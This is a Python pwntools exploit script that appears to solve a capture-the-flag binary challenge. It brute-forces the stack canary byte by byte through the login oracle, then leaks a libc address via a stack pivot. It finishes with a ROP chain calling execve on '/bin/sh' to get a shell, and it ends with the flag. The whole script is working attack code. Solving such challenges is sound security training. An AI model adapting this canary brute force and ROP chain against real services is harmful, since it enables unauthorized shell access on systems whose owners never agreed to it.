#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'

gdbscript="""b*0x4014db
b*0x40158a"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("127.0.0.1", 15787)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

def menu(choice):
    p.sendlineafter(b'Your choice: ', str(choice).encode())

def login(password):
    menu(1)
    p.sendafter(b'Enter your password:\n', password)

def gets(new_pw):
    menu(2)
    p.sendlineafter(b'Enter your input:', new_pw)

def quit():
    menu(3)

def brute_canary():
    canary = b'\xff'
    for i in range(7):
        for byte in range(1, 256):
            login(canary + bytes([byte]) + b"\x00")
            if b"successfully" in p.recvline():
                # print("Found byte: ", bytes([byte]).hex())
                canary += bytes([byte])
                # print(canary)
                break
    return u64(canary) & 0xffffffffffffff00

def brute_libc():
    leak = b"\xa0"
    for i in range(5):
        for byte in range(1, 256):
            login(leak + bytes([byte]) + b"\x00")
            if b"successfully" in p.recvline():
                leak += bytes([byte])
                break
    return u64(leak.ljust(8, b'\x00'))

c = brute_canary()

log.info(f'Found canary: {hex(c)}')

payload = p64(0) * 7
payload += p64(c)
payload += p64(0x404110) #[rbp-0x50](our password) point to stderr
payload += p64(0x0004013DF) #rip
gets(payload)
menu(3)
leak = brute_libc()
libc.address = leak - libc.sym["_IO_2_1_stderr_"]
log.info(f'Found libc base: {hex(libc.address)}')

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b"/bin/sh"))
ret = rop.find_gadget(['ret'])[0]
execve = libc.sym["execve"]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
info(f"execve: {hex(execve)}")
payload = p64(0) * 7
payload += p64(c)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(0)
payload += p64(execve)
gets(payload)
menu(3)
p.interactive()

#HOLACTF{:E_HaVe_fuN_bruTe_f60f9d373ac1}